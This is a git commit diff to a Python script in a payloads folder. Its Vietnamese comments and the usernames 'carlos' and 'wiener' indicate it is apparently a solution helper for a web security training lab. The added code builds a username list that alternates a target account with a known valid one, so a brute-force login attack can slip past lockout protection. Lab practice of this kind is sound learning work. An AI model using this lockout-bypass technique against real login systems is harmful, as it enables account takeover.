2f55ba6c10953a918fb90c4d9fa7e2069c25e036
trthuyanh <127885426+trthuyanh@users.noreply.github.com>
2025-02-20 00:43:23 +0700

    Update a logic flaw in brute-force protection.py

--- payloads/a logic flaw in brute-force protection.py
+++ payloads/a logic flaw in brute-force protection.py
@@ -18,3 +18,20 @@ for i in listpw:
 print(payload)
 with open("passwd.txt", "w") as file:
     file.write("\n".join(str(item) for item in payload))
+#Tạo username để brute-force dự trên username đã đoán được
+i = 0
+y = 0
+payload = []
+# Dựa trên số lượng password tạo ra - số lượng chèn username hợp lệ sao cho count(passwd) = count(username)
+for i in range(100):
+    y +=1
+    print("carlos")
+    payload.append("carlos")
+    if y%2 == 0:
+        print("wiener")
+        payload.append("wiener")
+print(payload)
+print(len(payload))
+with open("username.txt", "w") as file:
+    file.write("\n".join(str(item) for item in payload))
+
